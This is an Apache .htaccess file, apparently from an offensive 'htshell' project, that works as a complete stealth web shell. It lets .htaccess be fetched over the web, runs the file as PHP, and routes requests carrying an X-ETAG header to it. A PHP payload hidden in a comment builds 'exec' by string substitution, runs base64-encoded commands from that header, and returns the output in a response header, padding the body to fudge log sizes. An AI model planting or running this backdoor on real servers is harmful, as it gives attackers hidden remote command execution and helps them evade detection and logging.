# Self contained .htaccess stealth web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com
    
# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
    Order allow,deny
    Allow from all
</Files>

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted 
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess

# Enable output buffering so we can fudge content length in logs
php_value output_buffering 1

# Rewrite supposed url to the .htaccess file if X-ETAG request header is set
RewriteEngine on
RewriteCond %{HTTP:X-ETAG} !^$
RewriteRule .* .htaccess [L]

# SHELL <?php ob_clean(); $e = str_replace('y','e','yxyc'); $e(base64_decode(substr($_SERVER['HTTP_X_ETAG'],2))." 2>&1", $o); header("X-ETAG: AA".base64_encode(implode("\r\n ", $o))); print str_repeat("A", 9326); ob_flush(); exit(); ?>
